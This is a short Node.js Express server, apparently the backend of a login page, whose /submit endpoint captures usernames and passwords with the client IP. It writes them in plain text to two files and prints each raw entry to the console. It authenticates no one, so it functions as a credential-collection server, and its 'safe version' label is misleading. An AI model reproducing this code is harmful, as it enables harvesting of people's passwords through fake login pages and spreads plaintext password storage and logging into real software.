// server.js — plain text login server (safe version)
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Main submissions file
const OUTFILE = path.join(__dirname, 'submissions.jsonl');

app.post('/submit', (req, res) => { 
  const { username, password } = req.body || {};
  
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Missing username or password' });
  }

  const entry = { username, password, time: new Date().toISOString(), ip: req.ip };

  // Debug file (for testing, optional)
  fs.appendFile('debug_submissions.txt', JSON.stringify(entry) + '\n', err => {
    if (err) console.error('Debug write error:', err);
  });

  // Main submissions file
  fs.appendFile(OUTFILE, JSON.stringify(entry) + '\n', err => {
    if (err) {
      console.error('Write error:', err);
      return res.status(500).json({ error: 'Could not save submission' });
    }

    // Log full submission for testing
    console.log('Saved submission (raw): ' + JSON.stringify(entry));
    
    res.json({ success: true });
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
